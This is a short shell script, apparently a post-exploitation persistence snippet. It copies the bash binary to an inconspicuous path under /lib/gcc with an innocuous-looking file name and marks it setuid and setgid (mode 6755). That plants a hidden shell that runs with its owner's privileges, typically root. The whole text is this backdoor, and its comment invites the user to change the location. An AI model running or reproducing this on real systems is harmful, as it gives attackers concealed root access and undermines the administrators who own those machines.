OUT_FOLDER="/lib/gcc" # Modify this as you wish
OUT_FILE="$OUT_FOLDER/rt_709505"
cp $(which bash) "$OUT_FILE"
chmod 6755 "$OUT_FILE"